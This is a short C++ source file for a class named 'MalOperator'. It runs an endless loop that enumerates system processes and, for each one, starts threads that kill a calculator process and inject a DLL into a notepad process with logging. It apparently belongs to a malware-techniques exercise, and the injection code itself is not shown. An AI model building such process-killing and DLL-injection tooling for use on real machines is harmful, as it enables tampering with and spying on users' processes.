#include "pch.h"
#include "MalOperator.h"
#include "KillFeature.h"
#include "InjectAndLogFeature.h"
#include "../Utils/RunningProcesses.h"

MalOperator::MalOperator() {
}

void MalOperator::Start() {

	std::unique_ptr killFeature = std::make_unique<KillFeature>(m_calcExe);
	std::unique_ptr injectFeature = std::make_unique<InjectAndLogFeature>(m_notepadExe, m_pathToDll);

	while (true) {
		// Enumerate all the processes in the system:
		for (auto& process : RunningProcesses()) {

			std::thread t1(&KillFeature::SearchAndRun, killFeature.get(), process.szExeFile, process.th32ProcessID);
			std::thread t2(&InjectAndLogFeature::SearchAndRun, injectFeature.get(), process.szExeFile, process.th32ProcessID);

			t1.join();
			t2.join();
		}
		// Sleep or perform other tasks as needed between creating threads
		std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Simulate some time
	}
}
